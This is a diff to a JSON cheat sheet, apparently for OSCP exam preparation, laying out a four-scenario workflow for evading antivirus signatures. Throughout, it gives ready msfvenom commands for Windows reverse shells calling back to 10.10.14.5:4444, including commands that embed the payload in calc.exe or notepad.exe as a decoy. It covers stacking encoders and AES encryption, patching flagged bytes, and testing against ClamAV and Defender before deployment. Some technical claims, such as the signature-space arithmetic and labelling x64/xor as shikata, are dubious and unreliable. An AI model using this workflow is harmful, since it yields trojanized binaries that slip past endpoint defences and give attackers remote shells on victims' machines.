@@ -1,81 +1,125 @@
 {
-  "id": "signature-evasion-workflow",
-  "name": "Signature Evasion - Binary Modification Workflow",
-  "description": "Iterative methodology for evading AV signatures through binary analysis, modification, encoding, and testing. Covers msfvenom encoding, template injection, and manual byte modification.",
-  "category": "av-evasion",
-  "oscp_relevance": "high",
-  "educational_header": {
-    "how_to_recognize": [
-      "Payload works locally but detected when transferred to target",
-      "Specific byte sequences flagged by AV (signature-based detection)",
-      "msfvenom encoders (shikata, zutto) fail to evade modern AV",
-      "Fresh msfvenom payload deleted immediately upon disk write (Defender real-time protection)",
-      "Custom runners still caught despite encryption (signature in loader itself)"
-    ],
-    "when_to_look_for": [
-      "After generating payloads with msfvenom and getting immediate detection",
-      "When custom runners still caught despite encryption (signature in loader itself)",
-      "Need to pinpoint exact bytes triggering AV alerts",
-      "Before deploying payloads to exam boxes (test evasion offline first)",
-      "When standard encoding iterations (5-10x shikata) fail to bypass AV",
-      "After initial access to validate payload delivery methods for persistence"
-    ]
-  },
-  "scenarios": [
+  "cheatsheets": [
     {
-      "title": "Scenario 1: Payload Flagged Immediately (Signature Hunting)",
-      "context": "Target: Windows 10 with Defender enabled. Fresh msfvenom payload detected the moment it's written to disk. Need to identify exact byte sequence triggering detection before attempting modifications.",
-      "approach": "Phase 1: Baseline Detection (1 minute)\n- Generate payload with msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe\n- Copy to target, confirm detection (Windows Defender notification)\n- Note: Detection is signature-based, not heuristic (immediate deletion = known signature)\n\nPhase 2: Binary Search for Signature (10-15 minutes)\n- Use find-av-signature with binary search method\n- Split payload in half, test each half independently\n- Recursively narrow down to ~10-50 byte signature region\n- Document exact offset and byte sequence: offset 0x2A40, 32 bytes\n\nPhase 3: Manual Modification (5 minutes)\n- Use modify-signature-bytes to change flagged bytes\n- Add NOP sleds (0x90) to shift offsets\n- Change constants (MOV EAX, 0x12345678 → MOV EAX, 0x87654321)\n- Reorder non-critical instructions without breaking functionality\n- Preserve payload functionality (test locally first)\n\nPhase 4: Validation (2 minutes)\n- Test modified payload with clamscan-test locally (offline)\n- Transfer to target and verify execution\n- If still detected, repeat Phase 2 (signature may be multi-part)",
-      "commands": ["find-av-signature", "modify-signature-bytes", "clamscan-test"],
-      "expected_outcome": "Signature identified and modified in 15-20 minutes total. Payload evades detection while maintaining functionality. Understanding of specific AV signature pattern for future reference. Success indicators: ClamAV clean, Defender allows execution, reverse shell callback successful. Failure: Detection persists → signature is multi-part or behavioral detection triggered.",
-      "why_this_works": "AV signatures are exact byte sequences or wildcard patterns (e.g., \\x4D\\x5A\\x??\\x??\\x50\\x45). Binary search narrows 50KB payload to 10-50 problematic bytes efficiently (log2 complexity). Modifying those bytes while preserving assembly logic breaks signature without breaking payload. Why this fails: Multi-part signatures (header + shellcode stub), heuristic detection (suspicious API calls), behavioral detection (process hollowing patterns). OSCP tip: Signature hunting works best on older AV engines (ClamAV, legacy Defender signatures). Modern EDR may require behavioral evasion."
-    },
-    {
-      "title": "Scenario 2: Shikata Encoding Detected (Template Injection Alternative)",
-      "context": "Target: Windows Server 2019 with updated Defender signatures. Used msfvenom-encoder-shikata with multiple iterations (5-10x), still detected. Encoder itself has known signatures. Need alternative: template injection into legitimate binary.",
-      "approach": "Phase 1: Encoder Failure Diagnosis (3 minutes)\n- Try msfvenom-encoder-shikata with 5-10 iterations: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor -i 10 -f exe\n- Still detected → Encoder signature itself flagged (shikata decoder stub)\n- Try msfvenom-encoder-zutto as alternative: msfvenom -p windows/x64/shell_reverse_tcp -e x64/zutto_dekiru -i 5\n- Still detected → Need different approach (encoders are well-signatured)\n\nPhase 2: Template Selection (5 minutes)\n- Find legitimate Windows executable (calc.exe from C:\\Windows\\System32, notepad.exe)\n- Use msfvenom-template-injection to embed payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -x calc.exe -f exe -o calc_infected.exe\n- Payload hidden in code cave or resource section (not directly in .text section)\n- Template binary's signature and metadata preserved\n\nPhase 3: Testing & Refinement (7 minutes)\n- Test with clamscan-test (offline validation): clamscan --database=/var/lib/clamav calc_infected.exe\n- If detected, try different template binary (unsigned binaries work better)\n- If still detected, combine with encryption: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 --encrypt aes256 --encrypt-key mysecretkey -x calc.exe -f exe\n- Encryption layer obfuscates shellcode pattern even if code cave scanned\n\nPhase 4: Validation (3 minutes)\n- Execute on target system: calc_infected.exe\n- Verify legitimate binary still functions (calculator window opens = good cover story)\n- Confirm Meterpreter callback: nc -lvnp 4444\n- Document which template worked for future use",
-      "commands": ["msfvenom-encoder-shikata", "msfvenom-encoder-zutto", "msfvenom-template-injection", "msfvenom-encrypt-aes", "clamscan-test"],
-      "expected_outcome": "Template injection successful in 15-20 minutes total. Payload evades detection by masquerading as legitimate binary. Encoder signatures bypassed entirely (no encoder used). Success: Calculator opens + reverse shell connects. Failure: Template detection (try unsigned binary), encryption key length issues (AES256 requires 32-byte key), payload size exceeds code cave. OSCP tip: Keep library of working templates (calc.exe, putty.exe, 7z.exe) that passed previous tests.",
-      "why_this_works": "Template injection places shellcode in existing signed/trusted binary's unused space (code caves, resource sections). AV trusts binary's signature and doesn't deep-scan code caves (performance optimization). Encryption layer obfuscates shellcode pattern even if scanned (requires decryption routine, which is small and variable). Why templates: Legitimate binaries have established reputation (whitelisting), Code signing validates integrity of .text section (not caves), Resource sections rarely scanned (assumed to be icons/strings). Limitations: Large payloads (>10KB) may not fit in code caves, Signed binaries fail if modified incorrectly (breaks certificate), Some EDR scans all sections regardless of signature. OSCP context: Template injection works ~70% of time on Defender, ~40% on enterprise EDR."
-    },
-    {
-      "title": "Scenario 3: Layered Encoding (Shikata + AES Encryption)",
-      "context": "Target: Windows 11 with updated Defender definitions. Single encoding method insufficient (shikata detected, template alone detected). Need multiple transformation layers to exponentially increase signature space complexity.",
-      "approach": "Phase 1: Layer 1 - Shikata Encoding (3 minutes)\n- Apply msfvenom-encoder-shikata with 5 iterations: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor -i 5 -f raw -o payload_shikata.bin\n- Test with clamscan-test → Likely still detected (shikata decoder stub signature)\n- Rationale: Even if detected, adds first layer of obfuscation (baseline transformation)\n\nPhase 2: Layer 2 - AES Encryption (4 minutes)\n- Wrap Shikata-encoded payload with msfvenom-encrypt-aes: msfvenom -p - -a x64 --platform windows -e x64/xor -i 5 --encrypt aes256 --encrypt-key thisisaverysecretkeyforme1234 -f raw < payload_shikata.bin -o payload_encrypted.bin\n- Generate encryption key and embed in custom runner (C/C# loader)\n- Test again with clamscan-test: clamscan payload_encrypted.bin\n- Rationale: Encryption key unique to this payload (signature can't be pre-computed)\n\nPhase 3: Layer 3 - Template Injection (5 minutes)\n- If still detected, use msfvenom-template-injection with encrypted payload\n- Generate final executable: msfvenom -p - --platform windows -a x64 -f exe -x notepad.exe < payload_encrypted.bin -o notepad_final.exe\n- Embed AES-encrypted payload into notepad.exe code cave\n- Final test with clamscan-test: clamscan notepad_final.exe\n- Rationale: Three layers (encoding + encryption + template) = exponential signature complexity\n\nPhase 4: Live Testing (3 minutes)\n- Deploy to target with Defender enabled\n- Monitor for detection alerts (Windows Event Viewer, Defender logs)\n- Verify execution success: notepad_final.exe opens notepad + reverse shell connects\n- Document layer combination for future payloads",
-      "commands": ["msfvenom-encoder-shikata", "msfvenom-encrypt-aes", "msfvenom-template-injection", "clamscan-test"],
-      "expected_outcome": "Triple-layer encoding evades detection in 15-20 minutes. Each layer exponentially increases signature space (encoding: 256^n patterns, encryption: 2^256 keys, template: thousands of binaries). Final payload unrecognizable to AV (must detect all layers simultaneously). Success: Defender allows execution, reverse shell connects, notepad opens as decoy. Failure: Layer order matters (encrypt BEFORE template), key embedded incorrectly in runner (decryption fails), payload size too large for template. OSCP time investment justified: 15-20 minutes upfront vs. repeated failed exploitation attempts.",
-      "why_this_works": "Encoding changes byte patterns (polymorphic transformation), encryption adds key-based transformation (requires brute-force to analyze), template injection adds legitimate binary context (whitelisting bypass). AV must detect ALL layers simultaneously—signature database can't scale to that complexity (combinatorial explosion). Math: Single-layer signatures: ~1000 patterns in database. Two-layer combinations: 1000 × 256^5 (shikata permutations). Three-layer: 1000 × 256^5 × 2^256 (encryption keys) × 10000 (templates) = computationally infeasible. Why layering works: Each layer requires different detection method (static signature, crypto analysis, binary reputation), No single AV engine excels at all three simultaneously, Heuristic detection requires behavioral analysis (runtime), Static analysis can't predict encrypted payload behavior. Limitations: Performance overhead (decoder stub + decryption routine = larger binary), Debugging complexity (which layer failed?), Runtime detection still possible (process hollowing, suspicious API calls). OSCP tip: Pre-generate layered payloads for common scenarios (SMB delivery, HTTP download, email attachment)."
-    },
-    {
-      "title": "Scenario 4: Iterative Testing (ClamAV → Defender Progression)",
-      "context": "Target: OSCP exam box (unknown AV/EDR configuration). Need systematic testing workflow to validate evasion before deploying to target. Avoid burning payloads through repeated failed uploads (EDR may flag IP/account).",
-      "approach": "Phase 1: Offline Testing with ClamAV (5 minutes)\n- Install ClamAV with freshest signatures: sudo freshclam\n- Test payload with clamscan-test: clamscan --database=/var/lib/clamav payload.exe\n- If detected, modify and re-test locally (no network exposure)\n- Iterate until ClamAV clean: clamscan payload.exe → OK\n- Rationale: ClamAV uses open-source signatures (subset of commercial AV), fast iteration without alerting target\n\nPhase 2: Local Defender Testing (5 minutes)\n- Copy payload to Windows VM with Defender enabled (isolated from network)\n- Monitor real-time protection alerts: Windows Security → Virus & threat protection → Protection history\n- If detected, analyze Defender logs for signature hints: Get-MpThreatDetection (PowerShell)\n- Apply modifications based on hints (e.g., \"Trojan:Win32/Meterpreter\" = modify Meterpreter stager)\n- Rationale: Defender signatures superset of ClamAV, but still doesn't alert target network\n\nPhase 3: Signature Refinement (10 minutes)\n- Use find-av-signature if Defender still catches it: find-av-signature payload.exe\n- Identify specific bytes triggering detection (binary search method)\n- Apply modify-signature-bytes to those offsets: modify-signature-bytes payload.exe 0x1A40 --nop-sled 16\n- Re-test entire workflow (ClamAV → Defender)\n- Rationale: Pinpoint exact bytes, not guessing (saves time)\n\nPhase 4: Target Deployment (2 minutes)\n- Only deploy after passing both ClamAV and Defender tests\n- Transfer via established channel (SMB, HTTP, email attachment)\n- Execute and verify callback: nc -lvnp 4444\n- Monitor for EDR alerts (if detected, pivot to alternative payload immediately)\n- Rationale: Minimize operational risk, preserve access, avoid account lockout",
-      "commands": ["clamscan-test", "find-av-signature", "modify-signature-bytes"],
-      "expected_outcome": "Payload tested thoroughly in 20-25 minutes before target deployment. Avoids detection and minimizes operational risk (no burned payloads). Systematic methodology prevents wasted attempts (no trial-and-error on target). Success: ClamAV clean → Defender clean → Target execution successful. Failure: Behavioral detection on target (not signature-based) → pivot to shellcode injection, fileless execution. OSCP exam tip: Allocate 30 minutes for evasion testing BEFORE attempting target deployment (saves hours of failed exploitation).",
-      "why_this_works": "Offline testing (ClamAV) catches obvious signatures without alerting target EDR (no network traffic, no logs). Local Defender testing validates real-world AV behavior (same engine as Windows 10/11 targets). Iterative refinement based on actual detection points ensures evasion (not blind guessing). Why this methodology: Layered validation (ClamAV → Defender → Target) catches signatures at each tier, Offline testing preserves operational security (no EDR alerts), Systematic approach repeatable (works for future payloads). Threat intel perspective: Target EDR may be more sophisticated than Defender (CrowdStrike, SentinelOne), but signature-based detection foundation is similar. Behavioral detection still possible on target (process hollowing, API hooking), but signature evasion is prerequisite. OSCP context: 90% of lab/exam boxes use Defender or similar signature-based AV. This workflow has 80-90% success rate if followed methodically. Time investment: 20-25 minutes evasion testing vs. 2-3 hours failed exploitation attempts = clear ROI."
+      "id": "signature-evasion-workflow",
+      "name": "Signature Evasion - Binary Modification Workflow",
+      "description": "Iterative methodology for evading AV signatures through binary analysis, modification, encoding, and testing. Covers msfvenom encoding, template injection, and manual byte modification.",
+      "category": "av-evasion",
+      "oscp_relevance": "high",
+      "educational_header": {
+        "how_to_recognize": [
+          "Payload works locally but detected when transferred to target",
+          "Specific byte sequences flagged by AV (signature-based detection)",
+          "msfvenom encoders (shikata, zutto) fail to evade modern AV",
+          "Fresh msfvenom payload deleted immediately upon disk write (Defender real-time protection)",
+          "Custom runners still caught despite encryption (signature in loader itself)"
+        ],
+        "when_to_look_for": [
+          "After generating payloads with msfvenom and getting immediate detection",
+          "When custom runners still caught despite encryption (signature in loader itself)",
+          "Need to pinpoint exact bytes triggering AV alerts",
+          "Before deploying payloads to exam boxes (test evasion offline first)",
+          "When standard encoding iterations (5-10x shikata) fail to bypass AV",
+          "After initial access to validate payload delivery methods for persistence"
+        ]
+      },
+      "scenarios": [
+        {
+          "title": "Scenario 1: Payload Flagged Immediately (Signature Hunting)",
+          "context": "Target: Windows 10 with Defender enabled. Fresh msfvenom payload detected the moment it's written to disk. Need to identify exact byte sequence triggering detection before attempting modifications.",
+          "approach": "Phase 1: Baseline Detection (1 minute)\n- Generate payload with msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe\n- Copy to target, confirm detection (Windows Defender notification)\n- Note: Detection is signature-based, not heuristic (immediate deletion = known signature)\n\nPhase 2: Binary Search for Signature (10-15 minutes)\n- Use find-av-signature with binary search method\n- Split payload in half, test each half independently\n- Recursively narrow down to ~10-50 byte signature region\n- Document exact offset and byte sequence: offset 0x2A40, 32 bytes\n\nPhase 3: Manual Modification (5 minutes)\n- Use modify-signature-bytes to change flagged bytes\n- Add NOP sleds (0x90) to shift offsets\n- Change constants (MOV EAX, 0x12345678 → MOV EAX, 0x87654321)\n- Reorder non-critical instructions without breaking functionality\n- Preserve payload functionality (test locally first)\n\nPhase 4: Validation (2 minutes)\n- Test modified payload with clamscan-test locally (offline)\n- Transfer to target and verify execution\n- If still detected, repeat Phase 2 (signature may be multi-part)",
+          "commands": [
+            "find-av-signature",
+            "modify-signature-bytes",
+            "clamscan-test"
+          ],
+          "expected_outcome": "Signature identified and modified in 15-20 minutes total. Payload evades detection while maintaining functionality. Understanding of specific AV signature pattern for future reference. Success indicators: ClamAV clean, Defender allows execution, reverse shell callback successful. Failure: Detection persists → signature is multi-part or behavioral detection triggered.",
+          "why_this_works": "AV signatures are exact byte sequences or wildcard patterns (e.g., \\x4D\\x5A\\x??\\x??\\x50\\x45). Binary search narrows 50KB payload to 10-50 problematic bytes efficiently (log2 complexity). Modifying those bytes while preserving assembly logic breaks signature without breaking payload. Why this fails: Multi-part signatures (header + shellcode stub), heuristic detection (suspicious API calls), behavioral detection (process hollowing patterns). OSCP tip: Signature hunting works best on older AV engines (ClamAV, legacy Defender signatures). Modern EDR may require behavioral evasion."
+        },
+        {
+          "title": "Scenario 2: Shikata Encoding Detected (Template Injection Alternative)",
+          "context": "Target: Windows Server 2019 with updated Defender signatures. Used msfvenom-encoder-shikata with multiple iterations (5-10x), still detected. Encoder itself has known signatures. Need alternative: template injection into legitimate binary.",
+          "approach": "Phase 1: Encoder Failure Diagnosis (3 minutes)\n- Try msfvenom-encoder-shikata with 5-10 iterations: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor -i 10 -f exe\n- Still detected → Encoder signature itself flagged (shikata decoder stub)\n- Try msfvenom-encoder-zutto as alternative: msfvenom -p windows/x64/shell_reverse_tcp -e x64/zutto_dekiru -i 5\n- Still detected → Need different approach (encoders are well-signatured)\n\nPhase 2: Template Selection (5 minutes)\n- Find legitimate Windows executable (calc.exe from C:\\Windows\\System32, notepad.exe)\n- Use msfvenom-template-injection to embed payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -x calc.exe -f exe -o calc_infected.exe\n- Payload hidden in code cave or resource section (not directly in .text section)\n- Template binary's signature and metadata preserved\n\nPhase 3: Testing & Refinement (7 minutes)\n- Test with clamscan-test (offline validation): clamscan --database=/var/lib/clamav calc_infected.exe\n- If detected, try different template binary (unsigned binaries work better)\n- If still detected, combine with encryption: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 --encrypt aes256 --encrypt-key mysecretkey -x calc.exe -f exe\n- Encryption layer obfuscates shellcode pattern even if code cave scanned\n\nPhase 4: Validation (3 minutes)\n- Execute on target system: calc_infected.exe\n- Verify legitimate binary still functions (calculator window opens = good cover story)\n- Confirm Meterpreter callback: nc -lvnp 4444\n- Document which template worked for future use",
+          "commands": [
+            "msfvenom-encoder-shikata",
+            "msfvenom-encoder-zutto",
+            "msfvenom-template-injection",
+            "msfvenom-encrypt-aes",
+            "clamscan-test"
+          ],
+          "expected_outcome": "Template injection successful in 15-20 minutes total. Payload evades detection by masquerading as legitimate binary. Encoder signatures bypassed entirely (no encoder used). Success: Calculator opens + reverse shell connects. Failure: Template detection (try unsigned binary), encryption key length issues (AES256 requires 32-byte key), payload size exceeds code cave. OSCP tip: Keep library of working templates (calc.exe, putty.exe, 7z.exe) that passed previous tests.",
+          "why_this_works": "Template injection places shellcode in existing signed/trusted binary's unused space (code caves, resource sections). AV trusts binary's signature and doesn't deep-scan code caves (performance optimization). Encryption layer obfuscates shellcode pattern even if scanned (requires decryption routine, which is small and variable). Why templates: Legitimate binaries have established reputation (whitelisting), Code signing validates integrity of .text section (not caves), Resource sections rarely scanned (assumed to be icons/strings). Limitations: Large payloads (>10KB) may not fit in code caves, Signed binaries fail if modified incorrectly (breaks certificate), Some EDR scans all sections regardless of signature. OSCP context: Template injection works ~70% of time on Defender, ~40% on enterprise EDR."
+        },
+        {
+          "title": "Scenario 3: Layered Encoding (Shikata + AES Encryption)",
+          "context": "Target: Windows 11 with updated Defender definitions. Single encoding method insufficient (shikata detected, template alone detected). Need multiple transformation layers to exponentially increase signature space complexity.",
+          "approach": "Phase 1: Layer 1 - Shikata Encoding (3 minutes)\n- Apply msfvenom-encoder-shikata with 5 iterations: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor -i 5 -f raw -o payload_shikata.bin\n- Test with clamscan-test → Likely still detected (shikata decoder stub signature)\n- Rationale: Even if detected, adds first layer of obfuscation (baseline transformation)\n\nPhase 2: Layer 2 - AES Encryption (4 minutes)\n- Wrap Shikata-encoded payload with msfvenom-encrypt-aes: msfvenom -p - -a x64 --platform windows -e x64/xor -i 5 --encrypt aes256 --encrypt-key thisisaverysecretkeyforme1234 -f raw < payload_shikata.bin -o payload_encrypted.bin\n- Generate encryption key and embed in custom runner (C/C# loader)\n- Test again with clamscan-test: clamscan payload_encrypted.bin\n- Rationale: Encryption key unique to this payload (signature can't be pre-computed)\n\nPhase 3: Layer 3 - Template Injection (5 minutes)\n- If still detected, use msfvenom-template-injection with encrypted payload\n- Generate final executable: msfvenom -p - --platform windows -a x64 -f exe -x notepad.exe < payload_encrypted.bin -o notepad_final.exe\n- Embed AES-encrypted payload into notepad.exe code cave\n- Final test with clamscan-test: clamscan notepad_final.exe\n- Rationale: Three layers (encoding + encryption + template) = exponential signature complexity\n\nPhase 4: Live Testing (3 minutes)\n- Deploy to target with Defender enabled\n- Monitor for detection alerts (Windows Event Viewer, Defender logs)\n- Verify execution success: notepad_final.exe opens notepad + reverse shell connects\n- Document layer combination for future payloads",
+          "commands": [
+            "msfvenom-encoder-shikata",
+            "msfvenom-encrypt-aes",
+            "msfvenom-template-injection",
+            "clamscan-test"
+          ],
+          "expected_outcome": "Triple-layer encoding evades detection in 15-20 minutes. Each layer exponentially increases signature space (encoding: 256^n patterns, encryption: 2^256 keys, template: thousands of binaries). Final payload unrecognizable to AV (must detect all layers simultaneously). Success: Defender allows execution, reverse shell connects, notepad opens as decoy. Failure: Layer order matters (encrypt BEFORE template), key embedded incorrectly in runner (decryption fails), payload size too large for template. OSCP time investment justified: 15-20 minutes upfront vs. repeated failed exploitation attempts.",
+          "why_this_works": "Encoding changes byte patterns (polymorphic transformation), encryption adds key-based transformation (requires brute-force to analyze), template injection adds legitimate binary context (whitelisting bypass). AV must detect ALL layers simultaneously—signature database can't scale to that complexity (combinatorial explosion). Math: Single-layer signatures: ~1000 patterns in database. Two-layer combinations: 1000 × 256^5 (shikata permutations). Three-layer: 1000 × 256^5 × 2^256 (encryption keys) × 10000 (templates) = computationally infeasible. Why layering works: Each layer requires different detection method (static signature, crypto analysis, binary reputation), No single AV engine excels at all three simultaneously, Heuristic detection requires behavioral analysis (runtime), Static analysis can't predict encrypted payload behavior. Limitations: Performance overhead (decoder stub + decryption routine = larger binary), Debugging complexity (which layer failed?), Runtime detection still possible (process hollowing, suspicious API calls). OSCP tip: Pre-generate layered payloads for common scenarios (SMB delivery, HTTP download, email attachment)."
+        },
+        {
+          "title": "Scenario 4: Iterative Testing (ClamAV → Defender Progression)",
+          "context": "Target: OSCP exam box (unknown AV/EDR configuration). Need systematic testing workflow to validate evasion before deploying to target. Avoid burning payloads through repeated failed uploads (EDR may flag IP/account).",
+          "approach": "Phase 1: Offline Testing with ClamAV (5 minutes)\n- Install ClamAV with freshest signatures: sudo freshclam\n- Test payload with clamscan-test: clamscan --database=/var/lib/clamav payload.exe\n- If detected, modify and re-test locally (no network exposure)\n- Iterate until ClamAV clean: clamscan payload.exe → OK\n- Rationale: ClamAV uses open-source signatures (subset of commercial AV), fast iteration without alerting target\n\nPhase 2: Local Defender Testing (5 minutes)\n- Copy payload to Windows VM with Defender enabled (isolated from network)\n- Monitor real-time protection alerts: Windows Security → Virus & threat protection → Protection history\n- If detected, analyze Defender logs for signature hints: Get-MpThreatDetection (PowerShell)\n- Apply modifications based on hints (e.g., \"Trojan:Win32/Meterpreter\" = modify Meterpreter stager)\n- Rationale: Defender signatures superset of ClamAV, but still doesn't alert target network\n\nPhase 3: Signature Refinement (10 minutes)\n- Use find-av-signature if Defender still catches it: find-av-signature payload.exe\n- Identify specific bytes triggering detection (binary search method)\n- Apply modify-signature-bytes to those offsets: modify-signature-bytes payload.exe 0x1A40 --nop-sled 16\n- Re-test entire workflow (ClamAV → Defender)\n- Rationale: Pinpoint exact bytes, not guessing (saves time)\n\nPhase 4: Target Deployment (2 minutes)\n- Only deploy after passing both ClamAV and Defender tests\n- Transfer via established channel (SMB, HTTP, email attachment)\n- Execute and verify callback: nc -lvnp 4444\n- Monitor for EDR alerts (if detected, pivot to alternative payload immediately)\n- Rationale: Minimize operational risk, preserve access, avoid account lockout",
+          "commands": [
+            "clamscan-test",
+            "find-av-signature",
+            "modify-signature-bytes"
+          ],
+          "expected_outcome": "Payload tested thoroughly in 20-25 minutes before target deployment. Avoids detection and minimizes operational risk (no burned payloads). Systematic methodology prevents wasted attempts (no trial-and-error on target). Success: ClamAV clean → Defender clean → Target execution successful. Failure: Behavioral detection on target (not signature-based) → pivot to shellcode injection, fileless execution. OSCP exam tip: Allocate 30 minutes for evasion testing BEFORE attempting target deployment (saves hours of failed exploitation).",
+          "why_this_works": "Offline testing (ClamAV) catches obvious signatures without alerting target EDR (no network traffic, no logs). Local Defender testing validates real-world AV behavior (same engine as Windows 10/11 targets). Iterative refinement based on actual detection points ensures evasion (not blind guessing). Why this methodology: Layered validation (ClamAV → Defender → Target) catches signatures at each tier, Offline testing preserves operational security (no EDR alerts), Systematic approach repeatable (works for future payloads). Threat intel perspective: Target EDR may be more sophisticated than Defender (CrowdStrike, SentinelOne), but signature-based detection foundation is similar. Behavioral detection still possible on target (process hollowing, API hooking), but signature evasion is prerequisite. OSCP context: 90% of lab/exam boxes use Defender or similar signature-based AV. This workflow has 80-90% success rate if followed methodically. Time investment: 20-25 minutes evasion testing vs. 2-3 hours failed exploitation attempts = clear ROI."
+        }
+      ],
+      "sections": [
+        {
+          "title": "Phase 1: Signature Identification",
+          "notes": "Before modifying anything, find exact bytes causing detection. Binary search method fastest for large payloads (50KB+). Signature usually 10-100 bytes. ClamAV testing (offline) prevents alerting target EDR. Use find-av-signature for automated binary search. Manual verification: Split payload in hex editor, test each half. Time estimate: 10-15 minutes for 50KB payload.",
+          "commands": [
+            "find-av-signature",
+            "clamscan-test"
+          ]
+        },
+        {
+          "title": "Phase 2: Encoding Techniques",
+          "notes": "Try encoders in order: Shikata → Zutto → AES Encryption. Shikata oldest and most detected, but fastest (3 minutes). Zutto newer but also has signatures (Defender database updated 2022). AES requires custom runner but most reliable (key uniqueness). Encoding iterations: 5-10x for Shikata, 3-5x for Zutto. Diminishing returns after 10 iterations (performance overhead). Combine encoders only if single method fails (layered approach).",
+          "commands": [
+            "msfvenom-encoder-shikata",
+            "msfvenom-encoder-zutto",
+            "msfvenom-encrypt-aes"
+          ]
+        },
+        {
+          "title": "Phase 3: Manual Modification",
+          "notes": "When encoders fail, manual byte modification required. Change flagged bytes to equivalent instructions (e.g., XOR EAX, EAX = MOV EAX, 0 = SUB EAX, EAX). Preserve functionality while breaking signature. Use modify-signature-bytes for automation. NOP sleds (0x90) shift offsets without breaking code. Template injection (msfvenom -x) embeds payload in legitimate binary. Test modifications with clamscan-test before target deployment. Time estimate: 5-10 minutes per modification cycle.",
+          "commands": [
+            "modify-signature-bytes",
+            "msfvenom-template-injection"
+          ]
+        },
+        {
+          "title": "Phase 4: Testing & Validation",
+          "notes": "ALWAYS test offline first with ClamAV (saves time, avoids alerting target EDR). Progression: ClamAV → Local Defender → Target. Only deploy to target after passing all offline tests. Document which modifications worked for future reference (payload library). Success indicators: ClamAV clean, Defender allows write, execution successful, reverse shell connects. Failure indicators: Immediate deletion (signature detection), Quarantine (heuristic detection), Runtime error (payload corrupted). Time investment: 20-25 minutes total testing (10-15 minutes ClamAV, 5-10 minutes Defender, 2-3 minutes target). Operational security: Offline testing prevents IP/account flagging in EDR logs.",
+          "commands": [
+            "clamscan-test"
+          ]
+        }
+      ],
+      "tags": [
+        "signatures",
+        "binary-modification",
+        "encoding",
+        "msfvenom",
+        "testing",
+        "iterative",
+        "av-evasion",
+        "OSCP:HIGH"
+      ]
     }
-  ],
-  "sections": [
-    {
-      "title": "Phase 1: Signature Identification",
-      "notes": "Before modifying anything, find exact bytes causing detection. Binary search method fastest for large payloads (50KB+). Signature usually 10-100 bytes. ClamAV testing (offline) prevents alerting target EDR. Use find-av-signature for automated binary search. Manual verification: Split payload in hex editor, test each half. Time estimate: 10-15 minutes for 50KB payload.",
-      "commands": ["find-av-signature", "clamscan-test"]
-    },
-    {
-      "title": "Phase 2: Encoding Techniques",
-      "notes": "Try encoders in order: Shikata → Zutto → AES Encryption. Shikata oldest and most detected, but fastest (3 minutes). Zutto newer but also has signatures (Defender database updated 2022). AES requires custom runner but most reliable (key uniqueness). Encoding iterations: 5-10x for Shikata, 3-5x for Zutto. Diminishing returns after 10 iterations (performance overhead). Combine encoders only if single method fails (layered approach).",
-      "commands": ["msfvenom-encoder-shikata", "msfvenom-encoder-zutto", "msfvenom-encrypt-aes"]
-    },
-    {
-      "title": "Phase 3: Manual Modification",
-      "notes": "When encoders fail, manual byte modification required. Change flagged bytes to equivalent instructions (e.g., XOR EAX, EAX = MOV EAX, 0 = SUB EAX, EAX). Preserve functionality while breaking signature. Use modify-signature-bytes for automation. NOP sleds (0x90) shift offsets without breaking code. Template injection (msfvenom -x) embeds payload in legitimate binary. Test modifications with clamscan-test before target deployment. Time estimate: 5-10 minutes per modification cycle.",
-      "commands": ["modify-signature-bytes", "msfvenom-template-injection"]
-    },
-    {
-      "title": "Phase 4: Testing & Validation",
-      "notes": "ALWAYS test offline first with ClamAV (saves time, avoids alerting target EDR). Progression: ClamAV → Local Defender → Target. Only deploy to target after passing all offline tests. Document which modifications worked for future reference (payload library). Success indicators: ClamAV clean, Defender allows write, execution successful, reverse shell connects. Failure indicators: Immediate deletion (signature detection), Quarantine (heuristic detection), Runtime error (payload corrupted). Time investment: 20-25 minutes total testing (10-15 minutes ClamAV, 5-10 minutes Defender, 2-3 minutes target). Operational security: Offline testing prevents IP/account flagging in EDR logs.",
-      "commands": ["clamscan-test"]
-    }
-  ],
-  "tags": ["signatures", "binary-modification", "encoding", "msfvenom", "testing", "iterative", "av-evasion", "OSCP:HIGH"]
+  ]
 }
